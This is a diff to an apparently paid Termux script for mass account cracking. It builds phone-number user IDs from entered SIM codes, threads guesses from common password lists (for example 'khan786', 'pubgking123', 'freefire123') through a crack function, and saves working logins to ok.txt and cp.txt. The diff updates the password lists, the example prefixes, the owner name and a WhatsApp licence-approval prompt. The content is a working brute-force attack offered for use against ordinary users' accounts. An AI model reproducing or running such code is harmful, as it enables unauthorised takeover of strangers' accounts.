@@ -1098,8 +1098,9 @@ logo = """
 --------------------------------------------------
 [•] AUTHOR     : \033[1;32mFK\033[1;37m
 [•] STATUS     : \033[1;32mPAID\033[1;37m
+[•] OWNER    : \033[1;32mFARHAAN\033[1;37m
 --------------------------------------------------
-[•] \033[1;37mVERSION    :\033[1;32m 1.0.4 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
+[•] \033[1;37mVERSION    :\033[1;32m 2.1.5 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
 --------------------------------------------------"""
 
 def lines():
@@ -1129,7 +1130,7 @@ def dynamic(text):
 def rehan():
 	os.system('clear')
 	print(logo)
-	print('[1] RANDOM PAK CLONING')
+	print('[1] RANDOM CLONING')
 	print('[2] RANDOM BD CLONING')
 	print('[3] RANDOM CHOICE PASS CLONING')
 	print('[4] CONTACT WITH OWNER')
@@ -1187,7 +1188,7 @@ def svn_digit():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[•] EXAMPLE :0328,0316,0308,0306.ETC')
 	lines()
 	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1222,7 +1223,7 @@ def ali_khan():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[•] EXAMPLE :0328,0316,0308,0306.ETC')
 	lines()
 	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1244,7 +1245,7 @@ def ali_khan():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan786']
+			pwx = [guru,'khankhan123','khan786786','khan786123','khan123321','khan876321']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -1263,7 +1264,7 @@ def malik_baloch():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[√] EXAMPLE :0328,0316,0308,0306.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1285,7 +1286,7 @@ def malik_baloch():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'malik123','malik1122','baloch786']
+			pwx = [guru,'malik786','malik1786','baloch11234']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -1298,7 +1299,7 @@ def pubg():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[√] EXAMPLE :0328,0316,0308,92306.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1320,7 +1321,7 @@ def pubg():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'pubgqueen','pubgking','pubglover']
+			pwx = [guru,'pubgqueen123','pubgking123','pubglover']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
@@ -1333,7 +1334,7 @@ def ff():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[√] EXAMPLE :0328,0316,0308,92306.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1355,7 +1356,7 @@ def ff():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'freefire','fflover','ffking','ffqueen']
+			pwx = [guru,'freefire123','fflover321','ffking321','ffqueen123']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
@@ -1546,13 +1547,13 @@ def approval():
     else:
       print("YOUR KEY : "+id)
       print('\33[1;37m----------------------------------------------')
-      print("\33[1;32m Note this tool is paid :") 
+      print("\33[1;32m Note FREE LENE WALE NAA AAYE :") 
       print("\33[1;37m----------------------------------------------")
       print("\33[1;37mTOOL IS PAID  YOU HAVE TO\nGET APPROVAL FIRST.")
       print('\33[1;37m----------------------------------------------')
-      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
+      print ('IF U  WANT FREE TO BUY PLS DONT PRESS ENTER')
       input('IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923062422672?text='+tks),approval()
+      tks = ('Hello%20Farhaan%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923062422672?text='+tks),approval()
       time.sleep(1)
       approval()
   except:
